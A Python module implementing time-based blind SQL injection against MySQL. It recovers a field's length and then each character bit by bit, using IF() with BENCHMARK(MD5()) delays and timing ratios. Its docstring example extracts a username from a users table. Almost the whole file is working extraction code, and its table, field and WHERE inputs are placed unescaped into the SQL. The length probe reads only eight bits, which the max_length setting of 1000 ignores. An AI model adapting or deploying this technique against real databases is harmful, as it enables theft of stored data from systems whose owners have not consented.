"""Core blind SQL extraction logic using timing-based techniques."""

import time
from typing import Any


def measure(cursor: Any, sql: str) -> float:
    """Execute a SQL query and return execution time in seconds.

    Args:
        cursor: Database cursor to execute the query.
        sql: SQL query string to measure.

    Returns:
        Execution time in seconds as a float.

    Raises:
        Exception: If the SQL query fails to execute.
    """
    start_time = time.time()
    cursor.execute(sql)
    end_time = time.time()
    return end_time - start_time


def getlength(
    cursor: Any,
    field: str,
    table: str,
    where: str,
    iters: int = 500000,
    sensitivity: int = 100,
) -> int:
    """Extract the length of a field value using blind injection timing.

    Args:
        cursor: Database cursor to execute queries.
        field: Field name to measure.
        table: Table name to query.
        where: WHERE clause condition.
        iters: Number of benchmark iterations for timing delay.
        sensitivity: Time ratio threshold to consider bit as 1.

    Returns:
        The length of the field value as an integer.

    Raises:
        Exception: If SQL query fails.
    """
    accum = 0
    mintime = measure(cursor, "SELECT CURDATE()")

    if mintime == 0:
        mintime = 0.0001

    for b in range(0, 8):
        bitpos = 1 << b
        sql = (
            f"SELECT IF(LENGTH({field}) & {bitpos}, "
            f"BENCHMARK({iters}, MD5('cc')), 0) "
            f"FROM {table} WHERE {where};"
        )
        exec_time = measure(cursor, sql)

        bit = int((exec_time / mintime) > sensitivity)
        if bit == 1:
            accum += bitpos

    return accum


def getbits(
    cursor: Any,
    pos: int,
    field: str,
    table: str,
    where: str,
    iters: int = 500000,
    sensitivity: int = 100,
) -> int:
    """Extract a single character's bitmask at given position.

    Args:
        cursor: Database cursor to execute queries.
        pos: Position of the character to extract (1-indexed).
        field: Field name to extract from.
        table: Table name to query.
        where: WHERE clause condition.
        iters: Number of benchmark iterations for timing delay.
        sensitivity: Time ratio threshold to consider bit as 1.

    Returns:
        The bitmask value of the character at the given position.

    Raises:
        Exception: If SQL query fails.
    """
    accum = 0
    mintime = measure(cursor, "SELECT CURDATE()")

    if mintime == 0:
        mintime = 0.0001

    for b in range(0, 8):
        bitpos = 1 << b
        sql = (
            f"SELECT IF(ORD(SUBSTRING({field},{pos},1)) & {bitpos}, "
            f"BENCHMARK({iters}, MD5('cc')), 0) "
            f"FROM {table} WHERE {where};"
        )
        exec_time = measure(cursor, sql)

        bit = int((exec_time / mintime) > sensitivity)
        if bit == 1:
            accum += bitpos

    return accum


def getdata(
    cursor: Any,
    field: str,
    table: str,
    where: str,
    iters: int = 500000,
    sensitivity: int = 100,
    max_length: int = 1000,
) -> str:
    """Extract the complete value from a field using blind injection.

    Args:
        cursor: Database cursor to execute queries.
        field: Field name to extract.
        table: Table name to query.
        where: WHERE clause condition.
        iters: Number of benchmark iterations for timing delay.
        sensitivity: Time ratio threshold to consider bit as 1.
        max_length: Maximum length to extract (default 1000).

    Returns:
        The extracted string value from the field.

    Raises:
        Exception: If SQL query fails.

    Example:
        >>> import MySQLdb
        >>> db = MySQLdb.connect(host="localhost", user="root", passwd="pass", db="test")
        >>> cursor = db.cursor()
        >>> result = getdata(cursor, "username", "users", "id=1")
        >>> print(result)
    """
    length = getlength(cursor, field, table, where, iters, sensitivity)

    if length == 0:
        return ""

    if length > max_length:
        length = max_length

    result = []
    for i in range(1, length + 1):
        char_code = getbits(cursor, i, field, table, where, iters, sensitivity)
        char = chr(char_code)
        result.append(char)

    return "".join(result)
